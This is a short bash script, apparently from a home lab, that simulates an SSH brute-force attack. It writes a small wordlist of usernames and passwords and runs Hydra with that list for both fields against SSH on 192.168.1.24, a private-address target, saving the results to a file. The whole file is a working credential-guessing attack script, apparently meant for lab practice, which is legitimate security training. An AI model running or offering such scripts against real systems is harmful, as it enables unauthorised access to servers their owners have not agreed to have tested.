#!/bin/bash
# SSH Bruteforce Simulation using Hydra
# Target: 192.168.1.24 (Ubuntu Server)
# Attacker: Kali Linux (192.168.1.29)

# Create wordlist
cat > wordlist.txt << 'EOF'
admin
root
user
hansen
raymond
hackerman
jadihacker
admin123
password123
jadihacker123
EOF

# Run Hydra
hydra -L wordlist.txt -P wordlist.txt 192.168.1.24 ssh -V -o hydra-results.txt

echo "Hydra scan completed. Check hydra-results.txt for details."
